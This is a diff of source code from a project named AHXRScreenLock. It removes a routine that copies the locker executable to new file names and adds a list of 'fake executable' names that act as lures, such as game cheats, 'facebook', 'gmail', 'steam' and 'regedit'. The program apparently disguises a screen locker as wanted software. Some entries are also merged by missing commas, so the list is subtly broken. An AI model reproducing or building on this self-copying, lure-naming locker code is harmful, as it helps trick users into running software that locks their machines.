@@ -20,33 +20,45 @@
 	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-#include <string>
-#include <fstream>
+#pragma once
 
-#include "settings.h"
-#include "pack.h"
-
-using namespace std;
-
-string LOCKER_FILE_NAME;
-
-void buildNewLocker(string fileName) {
-	ifstream
-		f_old;
-	ofstream
-		f_new;
-
-	puts(LOCKER_FILE_NAME.c_str());
-
-	f_old.open(LOCKER_FILE_NAME, ios::binary);
-	f_new.open(fileName, ios::binary);
-
-	f_new << f_old.rdbuf();
-
-	f_old.close();
-	f_new.close();
-}
-
-void setLockerFileName(string name) {
-	LOCKER_FILE_NAME = name;
-}
+char * c_fake_executables[] = {
+	"aimbot",
+	"mp3converter",
+	"mp4tomp3",
+	"xnxx",
+	"wallhack",
+	"facebook",
+	"youtube",
+	"bruteforce",
+	"twitter",
+	"proxy",
+	"poker",
+	"gmail"
+	"hotmail",
+	"csgo",
+	"css"
+	"dota2",
+	"tf2",
+	"discord",
+	"steam",
+	"l4d2",
+	"regedit",
+	"esp",
+	"hack4hack",
+	"iwantcheats",
+	"iwantcheats",
+	"fpscheats",
+	"dota2boost",
+	"tmcheats",
+	"csgocheats",
+	"bhop",
+	"triggerbot",
+	"hack_inject",
+	"skinchanger",
+	"wh",
+	"glow",
+	"noflash",
+	"nofog",
+	"gui"
+};
